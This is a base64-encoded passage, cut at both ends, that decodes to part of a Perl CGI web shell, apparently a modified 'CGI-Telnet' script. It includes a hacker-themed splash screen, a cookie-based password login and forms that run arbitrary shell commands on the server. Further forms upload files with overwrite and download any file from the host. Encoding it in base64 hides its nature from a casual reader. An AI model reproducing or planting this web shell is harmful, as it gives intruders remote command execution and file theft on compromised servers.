CArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7CS8vIFdlIGhhdmVuJ3QgZmluaXNoZWQgbG9hZGluZyB5ZXQuICBIYXZlIHBhdGllbmNlLg0KICAgIHJldHVybjsNCiAgfQ0KICBpZih0aGlzLmN1cnJlbnRUZXh0ID09ICIiKSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gIiI7DQovLyAgdGhpcy5vcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQucmVwbGFjZSgvPChbXjxdKSo+LywgIiIpOyAgICAgLy8gU3RyaXAgSFRNTCBmcm9tIHRleHQuDQogIGlmKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCkgew0KICAgIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI8IiAmJiAhdGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgPSAiPCI7DQogICAgICB0aGlzLmluVGFnID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI+IiAmJiB0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSAiPiI7DQogICAgICB0aGlzLmluVGFnID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMudGFnQnVmZmVyOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiJiIgJiYgIXRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiJiI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IHRydWU7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiOyIgJiYgdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSAiOyI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLkhUTUxFbnRpdHlCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2Ugew0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICB9DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9IHRoaXMuY3VycmVudFRleHQ7DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCArPSAodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoIC0gMSA/ICh0eXBlb2YgdGhpcy5jdXJzb3IgPT0gImZ1bmN0aW9uIiA/IHRoaXMuY3Vyc29yKHRoaXMuY3VycmVudFRleHQpIDogdGhpcy5jdXJzb3IpIDogIiIpOw0KICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7DQogIH0gZWxzZSB7DQoJdGhpcy5jdXJyZW50VGV4dCA9ICIiOw0KCXRoaXMuY3VycmVudENoYXIgPSAwOw0KICAgICAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgICAgICAgdGhpcy5maW5pc2hlZENhbGxiYWNrKCk7DQogIH0NCn0NCjwvc2NyaXB0Pg0KPC9wcmU+DQoNCjxmb250IHN0eWxlPSJmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7Ij5Db3B5cmlnaHQgKEMpIDIwMDEgUm9oaXRhYiBCYXRyYSA8L2ZvbnQ+PGJyPjxicj4NCjx0YWJsZSBhbGlnbj0iY2VudGVyIiBib3JkZXI9IjEiIHdpZHRoPSI2MDAiIGhlaWdoPg0KPHRib2R5Pjx0cj4NCjx0ZCB2YWxpZ249InRvcCIgYmFja2dyb3VuZD0iaHR0cDovL2RsLmRyb3Bib3guY29tL3UvMTA4NjAwNTEvaW1hZ2VzL21hdHJhbi5naWYiPjxwIGlkPSJoYWNrIiBzdHlsZT0ibWFyZ2luLWxlZnQ6IDNweDsiPg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPiBQbGVhc2UgV2FpdCAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+DQoNCjxmb250IGNvbG9yPSIjMDA5OTAwIj4gVHJ5aW5nIGNvbm5lY3QgdG8gU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPg0KPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj5+XCQ8L2ZvbnQ+IENvbm5lY3RlZCAhIDwvZm9udD48YnI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gQ2hlY2tpbmcgU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4NCg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+IFRyeWluZyBjb25uZWN0IHRvIENvbW1hbmQgLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250Pjxicj4NCg0KPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+XCQgQ29ubmVjdGVkIENvbW1hbmQhIDwvZm9udD48YnI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjxmb250IGNvbG9yPSIjRjAwMDAwIj5cJDwvZm9udD48L2ZvbnQ+IE9LISBZb3UgY2FuIGtpbGwgaXQhPC9mb250Pg0KPC90cj4NCjwvdGJvZHk+PC90YWJsZT4NCjxicj4NCg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KbmV3IFR5cGluZ1RleHQoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhhY2siKSwgMzAsIGZ1bmN0aW9uKGkpeyB2YXIgYXIgPSBuZXcgQXJyYXkoIl8iLCIiKTsgcmV0dXJuICIgIiArIGFyW2kubGVuZ3RoICUgYXIubGVuZ3RoXTsgfSk7DQpUeXBpbmdUZXh0LnJ1bkFsbCgpOw0KDQo8L3NjcmlwdD4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBodG1sIHNwZWNpYWwgY2hhcnMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBIdG1sU3BlY2lhbENoYXJzKCQpew0KCW15ICR0ZXh0ID0gc2hpZnQ7DQoJJHRleHQgPX4gcy8mLyZhbXA7L2c7DQoJJHRleHQgPX4gcy8iLyZxdW90Oy9nOw0KCSR0ZXh0ID1+IHMvJy8mIzAzOTsvZzsNCgkkdGV4dCA9fiBzLzwvJmx0Oy9nOw0KCSR0ZXh0ID1+IHMvPi8mZ3Q7L2c7DQoJcmV0dXJuICR0ZXh0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBBZGQgbGluayBmb3IgZGlyZWN0b3J5DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQWRkTGlua0RpcigkKQ0Kew0KCW15ICRhYz1zaGlmdDsNCglteSBAZGlyPSgpOw0KCWlmKCRXaW5OVCkNCgl7DQoJCUBkaXI9c3BsaXQoL1xcLywkQ3VycmVudERpcik7DQoJfWVsc2UNCgl7DQoJCUBkaXI9c3BsaXQoIi8iLCZ0cmltKCRDdXJyZW50RGlyKSk7DQoJfQ0KCW15ICRwYXRoPSIiOw0KCW15ICRyZXN1bHQ9IiI7DQoJZm9yZWFjaCAoQGRpcikNCgl7DQoJCSRwYXRoIC49ICRfLiRQYXRoU2VwOw0KCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuJHBhdGguIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIG1lc3NhZ2UgdGhhdCBpbmZvcm1zIHRoZSB1c2VyIG9mIGEgZmFpbGVkIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2UNCnsNCglwcmludCA8PEVORDsNCjxicj5Mb2dpbiA6IEFkbWluaXN0cmF0b3I8YnI+DQoNClBhc3N3b3JkOjxicj4NCkxvZ2luIGluY29ycmVjdDxicj48YnI+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5Gb3JtDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+DQpMb2dpbiA6IEFkbWluaXN0cmF0b3I8YnI+DQpQYXNzd29yZDo8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlRm9vdGVyDQp7DQoJcHJpbnQgIjxicj48Zm9udCBjb2xvcj1yZWQ+by0tLVsgIDxmb250IGNvbG9yPSNmZjk5MDA+RWRpdCBieSAkRWRpdFBlcnNpb24gPC9mb250PiAgXS0tLW88L2ZvbnQ+PC9jb2RlPjwvY2VudGVyPjwvYm9keT48L2h0bWw+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZXRyZWl2ZXMgdGhlIHZhbHVlcyBvZiBhbGwgY29va2llcy4gVGhlIGNvb2tpZXMgY2FuIGJlIGFjY2Vzc2VzIHVzaW5nIHRoZQ0KIyB2YXJpYWJsZSAkQ29va2llc3snfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQoJew0KCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQoJCSRDb29raWVzeyRpZH0gPSAkdmFsOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiQ29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2luIGFnYWluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ291dA0Kew0KCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUNCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJJlByaW50TG9nb3V0U2NyZWVuOw0KDQoJJlByaW50TG9naW5TY3JlZW47DQoJJlByaW50TG9naW5Gb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQoJZXhpdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0DQojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0DQojIG1hdGNoIG9yIGlmIG5vIHBhc3N3b3JkIGlzIGVudGVyZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlcg0KIyB0byBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dpbiANCnsNCglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZA0KCXsNCgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsNCgkJJlByaW50UGFnZUhlYWRlcjsNCgkJcHJpbnQgJkxpc3REaXI7DQoJfQ0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkJJlByaW50TG9naW5TY3JlZW47DQoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFzc3dvcmQgd2FzIGVudGVyZWQNCgkJew0KCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOw0KDQoJCX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlleGl0Ow0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCglteSAkZGlyPSAiPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJjb21tYW5kIikuIjwvc3Bhbj4iOw0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyM2NmZmNjYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCglyZXR1cm4gPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KJFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjUwIiBuYW1lPSJjIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0InR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJbXkgJGRpciA9ICZBZGRMaW5rRGlyKCJkb3dubG9hZCIpOyANCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgY2xhc3M9ImZpbGUiIHR5cGU9InRleHQiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQoNCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCglteSAkZGlyPSAmQWRkTGlua0RpcigidXBsb2FkIik7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsNCglyZXR1cm4gPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgY2xhc3M9ImZpbGUiIHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KT3B0aW9uczogJm5ic3A7PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvIiBpZD0idXAiIHZhbHVlPSJvdmVyd3JpdGUiPg0KPGxhYmVsIGZvcj0idXAiPk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8L2xhYmVsPjxicj48YnI+DQpVcGxvYWQ6Jm5ic3A7Jm5ic3A7Jm5ic3A7PGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4NCg0KPC9mb3JtPg0KDQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcmV0dXJuIDw8RU5EOw0KPC90ZXh0YXJlYT4NCjxicj48Zm9udCBjb2xvcj15ZWxsb3c+DQpDb21tYW5kIGV4Y2VlZGVkIG1heGltdW0gdGltZSBvZiAkQ29tbWFuZFRpbWVvdXREdXJhdGlvbiBzZWNvbmQocykuPC9mb250Pg0KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250Pg0KRU5EDQoJfQ0KfQ0KDQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsNCglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglteSAkcmVzdWx0PSIiOw0KCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0KCXsNCgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsNCgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkcmVzdWx0IC49IDw8RU5EOw0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQoNCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4NCkVORA0KCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCX0NCgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6IC